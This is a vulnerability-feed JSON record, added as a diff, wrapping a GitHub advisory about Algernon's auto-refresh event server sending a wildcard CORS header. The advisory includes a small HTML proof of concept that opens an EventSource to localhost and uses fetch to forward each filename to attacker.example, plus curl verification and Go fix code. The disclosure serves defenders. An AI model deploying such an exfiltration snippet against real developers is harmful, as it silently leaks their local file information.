@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/24421368?v=4\", \"events_url\": \"https://api.github.com/users/Dredsen/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Dredsen/followers\", \"following_url\": \"https://api.github.com/users/Dredsen/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Dredsen/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Dredsen\", \"id\": 24421368, \"login\": \"Dredsen\", \"node_id\": \"MDQ6VXNlcjI0NDIxMzY4\", \"organizations_url\": \"https://api.github.com/users/Dredsen/orgs\", \"received_events_url\": \"https://api.github.com/users/Dredsen/received_events\", \"repos_url\": \"https://api.github.com/users/Dredsen/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Dredsen/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Dredsen/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Dredsen\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46431\", \"cvss\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-942\", \"name\": \"Permissive Cross-domain Security Policy with Untrusted Domains\"}], \"description\": \"### Summary\\n\\nThe SSE event server's `Access-Control-Allow-Origin` response header was hardcoded to the wildcard `*` regardless of the caller's `Origin`. Because `EventSource` does not preflight and does not send cookies, the wildcard is sufficient to let any third-party page the developer visits open a cross-origin `EventSource` to the SSE port and read the live filename stream from JavaScript. Combined with the lack of authentication (advisory #2a), no further trickery is required — any tab the developer opens has script-level read access to the stream.\\n\\nThis advisory covers the CORS configuration in isolation. The fix is independent of authentication and bind-address fixes: the wildcard could be replaced with a same-origin echo without touching either.\\n\\n### Details\\n\\n#### Root cause — hard-coded `\\\"*\\\"` passed as the CORS allowed-origin\\n\\n```go\\n// engine/config.go  (1.17.6, MustServe)\\nrecwatch.EventServer(absdir, \\\"*\\\", ac.eventAddr, ac.defaultEventPath, ac.refreshDuration)\\n```\\n\\nThe literal `\\\"*\\\"` is the second positional argument. The vendored `recwatch` implementation reflects it verbatim into the response header:\\n\\n```go\\n// vendor/github.com/xyproto/recwatch/eventserver.go:100-108  (1.17.6)\\nfunc GenFileChangeEvents(events TimeEventMap, mut *sync.Mutex, maxAge time.Duration, allowed string) http.HandlerFunc {\\n    return func(w http.ResponseWriter, _ *http.Request) {\\n        w.Header().Set(\\\"Content-Type\\\", \\\"text/event-stream;charset=utf-8\\\")\\n        w.Header().Set(\\\"Cache-Control\\\", \\\"no-cache\\\")\\n        w.Header().Set(\\\"Connection\\\", \\\"keep-alive\\\")\\n        w.Header().Set(\\\"Access-Control-Allow-Origin\\\", allowed)\\n        ...\\n    }\\n}\\n```\\n\\nThere is no decision based on the request's `Origin` header, and no allow-list mechanism — every caller is told their origin is approved.\\n\\n#### Why the wildcard is exploitable\\n\\n`EventSource` opens a `GET` request, never sends a preflight, and never carries cookies. The same-origin policy normally still blocks the response body from being read by JavaScript at a different origin — that is the role of `Access-Control-Allow-Origin`. When the server returns `*`, the browser permits the cross-origin script to read every `message` event.\\n\\nSo a developer running `algernon -a` on their workstation, with the SSE listener at `http://127.0.0.1:5553/sse` (Windows) or `http://0.0.0.0:5553/sse` (Linux/macOS), only needs to visit *any* third-party origin in another tab for the following to drain their stream silently:\\n\\n```html\\n<!doctype html>\\n<script>\\n  const s = new EventSource('http://127.0.0.1:5553/sse');\\n  s.onmessage = e => fetch('https://attacker.example/log?f=' + encodeURIComponent(e.data));\\n</script>\\n```\\n\\nThe exploit is cookie-less and CORS-clean — no SameSite, no third-party-cookie restriction, no preflight challenge applies. The user interaction is \\\"visit a webpage,\\\" which `UI:R` in the CVSS vector reflects.\\n\\n### PoC (against 1.17.6)\\n\\n```bash\\n# 1. Operator: algernon -a /path/to/project  on Windows; SSE at localhost:5553\\n# 2. Attacker lures the developer to https://news.example:\\n#    The page contains the snippet above.\\n# 3. EventSource opens, browser sends the request; algernon responds with\\n#    Access-Control-Allow-Origin: *, browser passes message events to the\\n#    cross-origin script; script ships filenames to attacker.example.\\n```\\n\\nCLI reproduction of the header is identical to advisory #2a's transcript; the relevant evidence is the `Access-Control-Allow-Origin: *` value in the response, not the body.\\n\\n### Impact\\n\\n- **Confidentiality:** medium. Cross-origin browser-tab read access to the file-change stream, with no server-side knowledge that the read happened.\\n- **Integrity:** none.\\n- **Availability:** none directly (the cross-origin tab does not exhaust resources beyond the user's own browser).\\n\\n### Suggestions to fix\\n\\n**Primary fix — echo a same-origin allow-list instead of `*`.**\\n\\n```go\\n// vendor/github.com/xyproto/recwatch/eventserver.go -- in GenFileChangeEvents\\norigin := r.Header.Get(\\\"Origin\\\")\\nif !isAllowedOrigin(origin) {\\n    http.Error(w, \\\"forbidden\\\", http.StatusForbidden)\\n    return\\n}\\nw.Header().Set(\\\"Access-Control-Allow-Origin\\\", origin)\\nw.Header().Set(\\\"Vary\\\", \\\"Origin\\\")\\n```\\n\\nThe `allowed` parameter must change from `\\\"*\\\"` to an explicit allow-list (or a single canonical server origin) — for example, `sseScheme + \\\"://\\\" + ac.serverAddr`. With the server's own scheme+host+port in `Allow-Origin`, a cross-origin request from `evil.example` is rejected by the browser because the response advertises a different origin.\\n\\n**Defence in depth — drop the legacy dedicated-port code path.** Mounting the SSE handler on the main mux instead lets the response omit `Access-Control-Allow-Origin` entirely (same-origin only by default). The dedicated `--eventserver`-style path is the only place `Access-Control-Allow-Origin` is set in the codebase; removing the dedicated path simplifies the surface.\\n\\n### Live verification\\n\\n```\\n$ ./algernon.exe --nodb --httponly --server -a --addr 127.0.0.1:18779 --quiet poc2/site\\n$ ( curl -sNi --max-time 2 -H \\\"Origin: http://evil.example\\\" http://127.0.0.1:5553/sse > sse.txt &\\n    sleep 1\\n    echo \\\"trigger\\\" >> poc2/site/probe.txt\\n    wait )\\n$ cat sse.txt\\nHTTP/1.1 200 OK\\nAccess-Control-Allow-Origin: *\\nCache-Control: no-cache\\nConnection: keep-alive\\nContent-Type: text/event-stream;charset=utf-8\\n...\\nid: 0\\ndata: C:\\\\Users\\\\xbox\\\\Desktop\\\\VulnTesting\\\\algernon-main\\\\poc-test\\\\poc2\\\\site\\\\probe.txt\\n```\\n\\nThe `Origin: http://evil.example` request header was echoed back as `Access-Control-Allow-Origin: *` (the wildcard — browsers treat this as \\\"any origin may read\\\"). A cross-origin tab at any URL can run `new EventSource(\\\"http://<algernon>:5553/sse\\\")` and read the stream.\", \"epss\": {\"percentage\": 0.00219, \"percentile\": 0.12217}, \"ghsa_id\": \"GHSA-hw27-4v2q-5qff\", \"github_reviewed_at\": \"2026-05-20T15:34:40Z\", \"html_url\": \"https://github.com/advisories/GHSA-hw27-4v2q-5qff\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hw27-4v2q-5qff\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46431\"}], \"nvd_published_at\": \"2026-05-26T17:16:51Z\", \"published_at\": \"2026-05-20T15:34:40Z\", \"references\": [\"https://github.com/xyproto/algernon/security/advisories/GHSA-hw27-4v2q-5qff\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-46431\", \"https://github.com/advisories/GHSA-hw27-4v2q-5qff\"], \"repository_advisory_url\": \"https://api.github.com/repos/xyproto/algernon/security-advisories/GHSA-hw27-4v2q-5qff\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/xyproto/algernon\", \"summary\": \"Algernon: Auto-refresh SSE event server sets Access-Control-Allow-Origin: *\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:27:35Z\", \"url\": \"https://api.github.com/advisories/GHSA-hw27-4v2q-5qff\", \"vulnerabilities\": [{\"first_patched_version\": \"1.17.7\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/xyproto/algernon\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.17.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hw27-4v2q-5qff",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/xyproto/algernon: <= 1.17.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-46431"
+    ],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/xyproto/algernon"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.186268Z",
+  "provenance": {
+    "content_sha256": "d65b14cfbfacc04f2d21703a5dc741a1fadcf6d7a5cff2a750359b21cba7b377",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-20T15:34:40Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hw27-4v2q-5qff",
+  "status": "active",
+  "title": "Algernon: Auto-refresh SSE event server sets Access-Control-Allow-Origin: *",
+  "updated_at": "2026-06-08T23:27:35Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hw27-4v2q-5qff"
+}
